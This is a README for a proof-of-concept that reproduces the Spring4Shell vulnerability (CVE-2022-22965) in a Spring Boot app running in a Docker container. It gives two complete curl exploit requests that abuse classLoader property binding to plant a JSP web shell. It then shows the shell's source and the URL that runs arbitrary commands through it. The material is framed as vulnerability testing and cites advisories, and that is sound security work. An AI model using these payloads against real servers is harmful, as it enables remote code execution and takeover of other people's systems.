# Replicate spring shell 0 day vulnerability
This is a POC to test spring shell vulnerability in a spring-boot app on multiple runtimes. You can test spring-boot WAR on Tomcat and spring-boot JAR


## Step 1: Prepare vulnerable service
Below are 2 paths to create a service. One is a spring-boot WAR running on standalone Tomcat and the other is a spring-boot jar executable

### spring-boot WAR on tomcat
1. Run command to:
   - Package a war file
   - Build a tomcat 8 JDK 11 image (This POC uses Amazon Corretto, but pick your applicable image)
   - Run a container from the image        
 `mvn clean package -P war && docker build . -f Dockerfile-war -t springshell && docker run --name springshell --rm -p 8080:8080 springshell`
2. Run curl command attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp name is springshell.jsp
   1. If the jsp is not created, _the application is not compromised_
```
curl --request POST \
  --url http://localhost:8080/springshell/zeroday \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --header 'c: Runtime' \
  --header 'prefix: <%' \
  --header 'suffix: %>//' \
  --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di' \
  --data class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp \
  --data class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT \
  --data class.module.classLoader.resources.context.parent.pipeline.first.prefix=springshell \
  --data class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
3. Review jsp content:
   `docker exec -it springshell bash -c "cd webapps/ROOT;cat springshell.jsp"` will display
   `<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %>//`
   _This means the application is compromised_

### spring-boot jar
1. Run command to:
    - Package a jar file
    - Build a JDK 11 image (This POC uses Amazon Corretto, but pick your applicable image)
    - Create a container from the image        
      `mvn clean package && docker build . -t springshell && docker run --name springshell --rm -p 8080:8080 springshell`
2. Run curl command that attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp name is springshell.jsp
    1. If the jsp is not created, _the application is not compromised_
```
curl --request POST \
  --url http://localhost:8080/zeroday \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --header 'c: Runtime' \
  --header 'prefix: <%' \
  --header 'suffix: %>//' \
  --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di' \
  --data class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp \
  --data class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT \
  --data class.module.classLoader.resources.context.parent.pipeline.first.prefix=springshell \
  --data class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
3. Check if a jsp file is present in embedded tomcat ROOT folder:
`docker exec -it springshell bash -c "cd /tmp/tomcat.*.8080/work/Tomcat/localhost/ROOT;ls"`. If there is no jsp, _the application is not compromised_

## Step 2: Exploitation
- Hit this url in the browser and update the shell cmd (_cmd_ query param) to print the result of the command
`http://localhost:8080/springshell.jsp?cmd=pwd`
  - If there is no response or a 404, _the application is not compromised_
  - If the output is the response of a shell command execution, _the application is compromised_. Refer remediation steps in the references below

## Reference
- https://tanzu.vmware.com/security/cve-2022-22965
- https://blog.sonatype.com/new-0-day-spring-framework-vulnerability-confirmed
- https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/